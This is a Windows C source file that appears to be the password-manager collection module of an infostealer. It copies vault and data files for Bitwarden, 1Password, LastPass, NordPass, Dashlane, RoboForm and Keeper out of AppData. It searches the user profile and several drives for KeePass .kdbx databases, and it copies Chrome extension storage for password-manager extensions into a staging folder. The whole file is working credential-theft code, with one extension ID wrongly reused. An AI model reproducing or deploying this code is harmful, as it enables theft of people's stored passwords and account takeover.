#include "passman.h"
#include "config.h"
#include <windows.h>

#ifdef ENABLE_PM_BITWARDEN
#include <string.h>
#include <stdio.h>

#define PM_MAX_PATH 512
#define PM_MAX_SIZE (20 * 1024 * 1024) /* 20 MB */
#define PM_MAX_FILES 512

/* ── Known password manager data paths (relative to AppData) ──── */

typedef struct {
    const char *name;
    const char *appdata_subdir; /* relative to LOCALAPPDATA or APPDATA */
    int use_roaming;            /* 1 = use APPDATA, 0 = use LOCALAPPDATA */
} PMEntry;

static const PMEntry pm_list[] = {
    { "Bitwarden",  "Bitwarden",                          1 },
    { "1Password",  "1Password\\data",                    0 },
    { "LastPass",   "LastPass",                           0 },
    { "NordPass",   "NordPass",                           0 },
    { "Dashlane",   "Dashlane",                           0 },
    { "RoboForm",   "RoboForm",                           0 },
    { "Keeper",     "Keeper",                             0 },
};

#define PM_COUNT (sizeof(pm_list) / sizeof(pm_list[0]))

/* ── Target file extensions ────────────────────────────────────── */

static const char *pm_exts[] = {
    "json", "kdbx", "1pux", "sqlite", "sqlite3",
    "csv", "xml", "dat",
    NULL
};

/* ── Bitwarden specific filename ───────────────────────────────── */

static const char *bw_files[] = {
    "data.json",
    "data.json.lock",
    NULL
};

/* ── Helper: check extension against target list ───────────────── */

static int has_pm_ext(const char *name) {
    const char *dot = strrchr(name, '.');
    if (!dot) return 0;
    dot++;
    for (int i = 0; pm_exts[i]; i++) {
        if (_stricmp(dot, pm_exts[i]) == 0)
            return 1;
    }
    return 0;
}

/* ── Helper: check if filename matches any known name ──────────── */

static int is_known_bw_file(const char *name) {
    for (int i = 0; bw_files[i]; i++) {
        if (_stricmp(name, bw_files[i]) == 0)
            return 1;
    }
    return 0;
}

/* ── Copy a single file ────────────────────────────────────────── */

static int copy_file(const char *src, const char *dst) {
    HANDLE hIn = CreateFileA(src, GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return -1;

    DWORD fileSize = GetFileSize(hIn, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0 || fileSize > PM_MAX_SIZE) {
        CloseHandle(hIn);
        return -1;
    }

    char *buf = (char *)HeapAlloc(GetProcessHeap(), 0, fileSize);
    if (!buf) {
        CloseHandle(hIn);
        return -1;
    }

    DWORD read = 0;
    BOOL ok = ReadFile(hIn, buf, fileSize, &read, NULL);
    CloseHandle(hIn);
    if (!ok || read == 0) {
        HeapFree(GetProcessHeap(), 0, buf);
        return -1;
    }

    HANDLE hOut = CreateFileA(dst, GENERIC_WRITE, 0,
                              NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, buf);
        return -1;
    }

    DWORD written = 0;
    ok = WriteFile(hOut, buf, read, &written, NULL);
    CloseHandle(hOut);
    HeapFree(GetProcessHeap(), 0, buf);
    return ok ? 0 : -1;
}

/* ── Copy all matching files in a directory ─────────────────────── */

static int copy_matching_files(const char *src_dir, const char *dst_dir,
                               size_t *count, int bw_mode) {
    char pattern[PM_MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", src_dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return -1;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (*count >= PM_MAX_FILES) break;

        /* In Bitwarden mode only copy known filenames, otherwise match extensions */
        if (bw_mode) {
            if (!is_known_bw_file(fd.cFileName)) continue;
        } else {
            if (!has_pm_ext(fd.cFileName)) continue;
        }

        DWORD hi = fd.nFileSizeHigh;
        DWORD lo = fd.nFileSizeLow;
        if (hi > 0 || lo > PM_MAX_SIZE) continue;

        char src_path[PM_MAX_PATH];
        snprintf(src_path, sizeof(src_path), "%s\\%s", src_dir, fd.cFileName);

        char dst_path[PM_MAX_PATH];
        snprintf(dst_path, sizeof(dst_path), "%s\\%s", dst_dir, fd.cFileName);

        if (copy_file(src_path, dst_path) == 0)
            (*count)++;

    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    return 0;
}

/* ── Recursive scan for .kdbx files across a drive/subtree ─────── */

static void scan_kdbx_recursive(const char *dir, const char *output_dir,
                                size_t *count, int depth) {
    if (depth > 6 || *count >= PM_MAX_FILES) return;

    char pattern[PM_MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (*count >= PM_MAX_FILES) break;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            /* Skip system directories and hidden dirs */
            if (fd.cFileName[0] == '.') continue;
            if (_stricmp(fd.cFileName, "Windows") == 0) continue;
            if (_stricmp(fd.cFileName, "Program Files") == 0) continue;
            if (_stricmp(fd.cFileName, "Program Files (x86)") == 0) continue;
            if (_stricmp(fd.cFileName, "ProgramData") == 0) continue;

            char subdir[PM_MAX_PATH];
            snprintf(subdir, sizeof(subdir), "%s\\%s", dir, fd.cFileName);
            scan_kdbx_recursive(subdir, output_dir, count, depth + 1);
            continue;
        }

        /* Check if this is a .kdbx file */
        const char *dot = strrchr(fd.cFileName, '.');
        if (dot && _stricmp(dot, ".kdbx") == 0) {
            DWORD hi = fd.nFileSizeHigh;
            DWORD lo = fd.nFileSizeLow;
            if (hi > 0 || lo > PM_MAX_SIZE) continue;

            char src_path[PM_MAX_PATH];
            snprintf(src_path, sizeof(src_path), "%s\\%s", dir, fd.cFileName);

            /* Create a unique destination name to avoid collisions */
            char dst_path[PM_MAX_PATH];
            snprintf(dst_path, sizeof(dst_path), "%s\\kdbx_%zu_%s",
                     output_dir, *count, fd.cFileName);

            if (copy_file(src_path, dst_path) == 0)
                (*count)++;
        }

    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}

/* ── Collect from a known PM directory ──────────────────────────── */

static int collect_pm_dir(const char *pm_name, const char *src_dir,
                          const char *output_dir, size_t *count, int bw_mode) {
    DWORD attr = GetFileAttributesA(src_dir);
    if (attr == INVALID_FILE_ATTRIBUTES ||
        !(attr & FILE_ATTRIBUTE_DIRECTORY))
        return 0;

    /* Create PM-specific output subdirectory */
    char pm_out[PM_MAX_PATH];
    snprintf(pm_out, sizeof(pm_out), "%s\\%s", output_dir, pm_name);
    CreateDirectoryA(pm_out, NULL);

    return copy_matching_files(src_dir, pm_out, count, bw_mode);
}

/* ── Main entry point ──────────────────────────────────────────── */

int passman_collect(const char *output_dir) {
    if (!output_dir) return -1;

    CreateDirectoryA(output_dir, NULL);

    const char *local = getenv("LOCALAPPDATA");
    const char *roaming = getenv("APPDATA");
    if (!local && !roaming) return -1;

    size_t count = 0;

    /* ── Collect from known password manager directories ─────────── */
    for (size_t i = 0; i < PM_COUNT; i++) {
        const PMEntry *e = &pm_list[i];
        const char *base = e->use_roaming ? roaming : local;
        if (!base) continue;

        char src_dir[PM_MAX_PATH];
        snprintf(src_dir, sizeof(src_dir), "%s\\%s", base, e->appdata_subdir);

        int bw_mode = (i == 0); /* Bitwarden = index 0 */
        collect_pm_dir(e->name, src_dir, output_dir, &count, bw_mode);
    }

    /* ── Scan for KeePassXC .kdbx files across common locations ──── */
    {
        char kdbx_out[PM_MAX_PATH];
        snprintf(kdbx_out, sizeof(kdbx_out), "%s\\KeePassXC", output_dir);
        CreateDirectoryA(kdbx_out, NULL);

        /* Check user profile root */
        const char *home = getenv("USERPROFILE");
        if (home) {
            scan_kdbx_recursive(home, kdbx_out, &count, 0);
        }

        /* Check common data locations */
        if (local) {
            scan_kdbx_recursive(local, kdbx_out, &count, 0);
        }

        /* Check Documents under roaming */
        if (roaming) {
            char docs[PM_MAX_PATH];
            snprintf(docs, sizeof(docs), "%s\\..\\Documents", roaming);
            scan_kdbx_recursive(docs, kdbx_out, &count, 0);
        }

        /* Check D:\ and E:\ if they exist */
        const char *drives[] = { "D:\\", "E:\\", "F:\\" };
        for (int d = 0; d < 3; d++) {
            DWORD da = GetFileAttributesA(drives[d]);
            if (da != INVALID_FILE_ATTRIBUTES) {
                scan_kdbx_recursive(drives[d], kdbx_out, &count, 0);
            }
        }
    }

    /* ── Scan browser extension settings for PM extensions ────────── */
    /* Mirrors the Zig pm_extensions logic: Local Extension Settings\{id} */
    if (local) {
        static const struct { const char *id; const char *name; } ext_ids[] = {
            { "nngceckbapebfimnlniiiaiaopbngkcc", "Bitwarden_ext" },
            { "fdjamakpfbbddfjaooikfcpapjohcfmg", "1Password_ext" },
            { "hdokiejnpimakedhajhdlcegeplioahd", "LastPass_ext" },
            { "fjohedfmdkclgkjgbmaadibebkbnagoo", "NordPass_ext" },
            { "fdjamakpfbbddfjaooikfcpapjohcfmg", "Dashlane_ext" },
            { "pnlccmojcmeohlpggmfnbbiapkmbliob", "RoboForm_ext" },
            { "oboonakemofpalcgghocfoadofidhfkk", "KeePassXC_ext" },
            { "bfogiafebfohielmfpndgfnnblcidlfn", "Keeper_ext" },
            { "aeblfdkhhhdcdjpifhhbdioieplbjndc", "1Password_ext2" },
        };

        for (int i = 0; i < (int)(sizeof(ext_ids) / sizeof(ext_ids[0])); i++) {
            char ext_dir[PM_MAX_PATH];
            snprintf(ext_dir, sizeof(ext_dir),
                     "%s\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\%s",
                     local, ext_ids[i].id);

            DWORD ea = GetFileAttributesA(ext_dir);
            if (ea == INVALID_FILE_ATTRIBUTES ||
                !(ea & FILE_ATTRIBUTE_DIRECTORY))
                continue;

            char ext_out[PM_MAX_PATH];
            snprintf(ext_out, sizeof(ext_out), "%s\\%s", output_dir, ext_ids[i].name);
            CreateDirectoryA(ext_out, NULL);

            copy_matching_files(ext_dir, ext_out, &count, 0);
        }
    }

    return (int)count;
}

#endif /* ENABLE_PM_BITWARDEN */
